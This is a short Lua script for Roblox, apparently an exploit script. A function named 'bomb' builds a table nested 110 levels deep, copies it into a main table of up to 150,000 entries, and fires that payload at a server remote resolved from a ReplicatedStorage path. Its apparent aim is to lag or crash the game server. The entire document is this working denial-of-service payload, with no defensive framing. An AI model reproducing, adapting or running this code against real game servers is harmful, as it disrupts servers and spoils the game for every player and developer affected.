local ActiveConfig = { tables = 110, loopWait = 0.35, tries = 1, maxTbl = 150000 }

local RemotePath = "RobloxReplicatedStorage.SetPlayerBlockList"

local function resolveRemote(path)
    if not path or path == "" then return nil end
    local obj = game
    local cleaned = path:gsub("^game%.", "")
    for seg in cleaned:gmatch("[^%.]+") do
        if obj then obj = obj[seg] else return nil end
    end
    return obj
end

local function bomb(tblInc, tries, maxTbl)
    local mainTbl = {}
    local nested = {{}}
    local z = nested[1]
    for i = 1, tblInc do
        local ins = {}
        table.insert(z, ins)
        z = ins
    end
    local maximum = math.floor((maxTbl or 150000) / (tblInc + 2))
    for i = 1, maximum do
        table.insert(mainTbl, nested)
        if i % 8000 == 0 then task.wait() end
    end
    local remote = resolveRemote(RemotePath)
    if remote then
        for i = 1, tries do
            pcall(function()
                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
                    remote:FireServer(mainTbl)
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer(mainTbl)
                end
            end)
        end
    end
end

